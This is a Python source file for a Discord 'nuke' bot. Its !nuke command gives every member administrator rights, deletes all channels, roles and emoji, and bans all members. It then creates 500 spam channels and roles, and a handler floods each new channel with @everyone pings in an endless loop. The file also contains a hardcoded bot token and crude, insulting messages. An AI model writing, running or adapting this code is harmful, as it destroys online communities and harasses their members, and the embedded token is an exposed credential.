import discord
from discord.ext import commands
import random
from discord import Permissions
from colorama import Fore, Style
import asyncio

token = "OTA0NDQwNTYwOTk0MTA3NDMz.YX7j6Q.oT56OYZIU7C3cTwjYkA5ywF_AqI"


SPAM_CHANNEL =  ["server devoured by ovo" , "unendable" , "left my mark" , "ran by cock","trained by ovo yuherd","zovo stepped","youre a loser","get shit on","caught laccin sonny","Bullied by rovo","ran by zovo and rovo","killed by zovo","cry me a river"]
SPAM_MESSAGE = ["@everyone ovoW ockW yuherd"]
rolenames = "ovo Stepped"
client = commands.Bot(command_prefix="!")


@client.event
async def on_ready():
   print(''' 
   

                                
                                        
                                                      
                                                      
                                                         
 ''')
   print('cockW Add me on cord 新 Cock / Rovo#4573 for any questions Btw youre a loser')
   print('Prefix is "!", run "!nuke" to fully nuke the server.')
   await client.change_presence(activity=discord.Game(name="watching 84 servers"))



@client.command()
@commands.is_owner()
async def stop(ctx):
    await ctx.bot.logout()
    print (Fore.GREEN + f"{client.user.name} Has logged out successfully." + Fore.RESET)



@client.command()
async def nuke(ctx):
    await ctx.message.delete()
    guild = ctx.guild
    try:
      role = discord.utils.get(guild.roles, name = "@everyone")
      await role.edit(permissions = Permissions.all())
      print(Fore.MAGENTA + "everyone got admin yuherd." + Fore.RESET)
    except:
      print(Fore.GREEN + "couldnt give admin" + Fore.RESET)
    for channel in guild.channels:
      try:
        await channel.delete()
        print(Fore.MAGENTA + f"{channel.name} was deleted, goodshit" + Fore.RESET)
      except:
        print(Fore.GREEN + f"{channel.name} was NOT deleted, RIP" + Fore.RESET)
    for member in guild.members:
     try:
       await member.ban()
       print(Fore.MAGENTA + f"{member.name}#{member.discriminator} Was banned, goodshit" + Fore.RESET)
     except:
       print(Fore.GREEN + f"{member.name}#{member.discriminator} Was unable to be banned, RIP" + Fore.RESET)
    for role in guild.roles:
     try:
       await role.delete()
       print(Fore.MAGENTA + f"{role.name} Has been deleted, goodshit" + Fore.RESET)
     except:
       print(Fore.GREEN + f"{role.name} Has not been deleted, RIP" + Fore.RESET)
    for emoji in list(ctx.guild.emojis):
     try:
       await emoji.delete()
       print(Fore.MAGENTA + f"{emoji.name} Was deleted, goodshit" + Fore.RESET)
     except:
       print(Fore.GREEN + f"{emoji.name} Wasn't Deleted, RIP" + Fore.RESET)
    banned_users = await guild.bans()
    for ban_entry in banned_users:
      user = ban_entry.user
      try:
        await user.unban("your username")
        print(Fore.MAGENTA + f"{user.name}#{user.discriminator} Was successfully unbanned, goodshit" + Fore.RESET)
      except:
        print(Fore.GREEN + f"{user.name}#{user.discriminator} Was not unbanned, RIP" + Fore.RESET)
    await guild.create_text_channel("zovo and rovo luv u")
    for channel in guild.text_channels:
        link = await channel.create_invite(max_age = 0, max_uses = 0)
        print(f"New Invite is: {link}")
    amount = 500
    for i in range(amount):
       await guild.create_text_channel(random.choice(SPAM_CHANNEL))
       await guild.create_role(name=rolenames)
    for user in list(ctx.guild.members):
        try:
            await user.ban()
        except:
         print(f"nuked {guild.name} Successfully, GG MAN OVO ON TOP")
    return

@client.event
async def on_guild_channel_create(channel):
  while True:
    await channel.send(random.choice(SPAM_MESSAGE))

client.run(token, bot=True)